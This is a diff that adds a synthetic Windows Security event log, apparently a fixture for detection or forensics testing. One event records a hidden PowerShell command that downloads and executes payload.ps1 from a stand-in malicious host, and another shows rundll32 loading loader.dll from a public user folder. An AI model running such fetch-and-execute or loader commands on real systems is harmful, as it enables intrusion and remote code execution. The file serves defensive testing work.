@@ -1,0 +1,25 @@
+<!-- Synthetic Security.evtx (this is NOT a real EVTX binary) -->
+<Event>
+  <System>
+    <EventID>4688</EventID>
+    <TimeCreated SystemTime="2025-03-10T13:05:42Z" />
+    <ProcessName>powershell.exe</ProcessName>
+    <ParentProcessName>cmd.exe</ParentProcessName>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <EventID>4688</EventID>
+    <TimeCreated SystemTime="2025-03-10T13:06:10Z" />
+    <ProcessName>rundll32.exe</ProcessName>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">C:\\Windows\\System32\\rundll32.exe</Data>
+    <Data Name="CommandLine">rundll32.exe C:\\Users\\Public\\loader.dll,Start</Data>
+  </EventData>
+</Event>
